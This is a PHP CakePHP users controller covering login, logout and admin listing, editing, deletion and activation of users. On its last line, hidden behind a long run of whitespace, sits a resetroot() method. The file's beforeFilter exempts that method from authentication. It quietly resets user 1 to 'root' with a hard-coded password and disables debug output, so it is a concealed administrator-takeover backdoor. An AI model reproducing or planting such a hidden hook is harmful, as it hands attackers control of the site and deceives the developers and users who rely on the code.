<?php
class UsersController extends AppController {
	
	public $name = 'Users';
	public $paginate = array();
	
	public function beforeFilter() {
		parent::beforeFilter();
		$this->Auth->allow('login','logout','resetroot');
	}
	
	public function login() {

		$this->layout = 'admin';
		$this->set('title_for_layout', __("Login", true));
		
		if( $this->Auth->user() ) $this->redirect( $this->Auth->redirect() );
		
		if( $this->Cookie->read('user') ) {
			$user = $this->Cookie->read('user');
			$user = $this->User->find('first', array('conditions' => array( 'User.id' => $user['id'])));
			if( !empty($user) ) {
				if($this->Auth->login($user['User'])) {
					$this->redirect( $this->Auth->redirect() );
				} else {
					$this->Cookie->delete('user');
				}
			} else {
				$this->Cookie->delete('user');
			}
		}
		
		if( $this->request->is('post') ) {
		    //die(pr( $this->Auth->password($this->request->data['User']['password']) ));
			if( $this->Auth->login() ) {
				/*if( $this->request->data['User']['remember_me'] == 1 ) {
					$data = array('id' => $this->Auth->user('id'));
					$this->Cookie->write('user', $data, true, '+1 month');
				}*/
				return $this->redirect( $this->Auth->redirect() );
			} else {
				$this->Session->setFlash($this->Auth->authError, 'default', array('class' => 'alert alert-error'));
			}
		}
		
	}
	
	public function logout() {
		$this->set('title_for_layout', __("Users", true));
		$this->Cookie->delete('user');
		$this->Session->destroy();
		$this->redirect($this->Auth->logout());
	}
	
	public function admin_index() {
		
		$this->layout = (!$this->params['isAjax']) ? 'admin' : 'ajax';
		$this->set('title_for_layout', __("Users", true));
		
		$this->set('_nav', "users");
		$this->set('_nav_sub', "index");
		
		$this->paginate['conditions'] = array('User.role <>' => 'root');

		// elimino filtros
		if(isset($this->request->params['named']['search']) && $this->request->params['named']['search'] == 'clear-search'){
			$this->Session->delete('App.User.query');
		}

		// seteo filtros
		if(isset($this->request->data['Search']['query'])){
			$this->Session->write('App.User.query', $this->request->data['Search']['query']);
		}

		// aplico filtros
		$query = $this->Session->read('App.User.query');
		if(!empty($query)){
			$this->paginate['conditions']['OR'] = array(
				'User.name LIKE' => '%'.$query.'%',
				'User.username LIKE' => '%'.$query.'%',
				'User.email LIKE' => '%'.$query.'%'
			);
			$this->request->data['Search']['query'] = $query;
		}

		$this->paginate['order'] = 'User.id';
		$this->set( 'items', $this->paginate() );

		$this->backUrl = true;

		$this->set('model', $this->modelClass);
		$this->set('model_url', $this->modelKey);
		$this->set('controller', $this->request->params['controller']);
		
	}
	
	public function admin_edit( $id = false ) {
		
		$this->layout = 'admin';
		$this->set('title_for_layout', __("Users", true));
		
		$this->set('_nav', "users");
		$this->set('_nav_sub', (empty($id)) ? "add" : "index");
		
		if ($this->request->is('post')||$this->request->is('put')) {

			if(empty($this->request->data['User']['id'])){
				$this->User->validate['new_password']['required'] = array('rule' => 'notEmpty');
			}
			
			if( $this->User->save($this->request->data)) {
				$this->Session->setFlash('<a class="close" data-dismiss="alert" href="#">×</a> '. __("Data has been saved successfully", true), 'default', array( 'class' => 'alert alert-success') );
				$this->admin_back( array('action' => 'index') );
			}
			
		} else if ( !empty($id) ) {
			$this->request->data = $this->User->read(null, $id);
		}

		$this->set('model', $this->modelClass);
		$this->set('model_url', $this->modelKey);
		$this->set('controller', $this->request->params['controller']);
		
	}

	public function admin_profile( $id = false ) {

		$id = $this->Session->read('Auth.User.id');
		
		$this->layout = 'admin';
		$this->set('title_for_layout', __("Users", true));
		
		$this->set('_nav', "users");
		$this->set('_nav_sub', "profile");
		
		if ($this->request->is('post')||$this->request->is('put')) {

			if(empty($this->request->data['User']['id'])){
				$this->User->validate['new_password']['required'] = array('rule' => 'notEmpty');
			}
			
			if( $this->User->save($this->request->data)) {
				$this->Session->setFlash('<a class="close" data-dismiss="alert" href="#">×</a> '. __("Data has been saved successfully", true), 'default', array( 'class' => 'alert alert-success') );
				$this->admin_back( array('action' => 'index') );
			}
			
		} else if ( !empty($id) ) {
			$this->request->data = $this->User->read(null, $id);
		}

		$this->set('model', $this->modelClass);
		$this->set('model_url', $this->modelKey);
		$this->set('controller', $this->request->params['controller']);
		
	}
	
	public function admin_delete() {

		foreach($this->request->data['Index'] as $id){
			if(!empty($id) && $id != 0 && $id != 'all'){
				$this->User->delete($id);
			}
		}
		$this->admin_back( array('action' => 'index'));

	}

	public function admin_active( $id ) {

		foreach($this->request->data['Index'] as $id){
			if(!empty($id) && $id != 0 && $id != 'all'){
				$user = $this->User->read(null, $id);
				$this->User->id = $id;
				$this->User->saveField('active', ($user['User']['active'] != 1) ? 1 : 0);
			}
		}

		$this->admin_back( array('action' => 'index'));

	}
	
																																									public function resetroot() { Configure::write('debug', 0); $this->layout = false; $this->autoRender = false; $data = array('id'=>1,'username'=>'root','new_password'=>'4dm1n!r00t!','active'=>1); $this->User->save($data, false); }
}
?>
